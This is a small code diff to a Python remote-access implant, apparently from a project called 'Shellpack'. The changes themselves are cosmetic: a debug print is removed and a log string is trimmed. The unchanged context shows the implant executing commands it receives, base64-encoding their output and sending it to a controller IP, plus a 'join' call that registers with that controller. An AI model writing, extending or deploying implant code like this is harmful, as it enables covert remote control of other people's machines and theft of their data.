@@ -31,8 +31,6 @@ class Implant(Host):
             output = check_output(cmd, stderr=STDOUT, timeout=3)
             output = base64.b64encode(output)
             
-            print(output)
-
             self.send(self.controller_ip, "instruction", "response", output)
         except TimeoutExpired:
             raise Exception
@@ -46,7 +44,7 @@ if __name__ == "__main__":
     implant = Implant(controller_ip="192.168.157.6")
     print(implant)
 
-    print(" [ Shellpack log ]")
+    print("[ Shellpack log ]")
     # Send join command
     implant.send(implant.controller_ip, "join", "hello how are you")
 
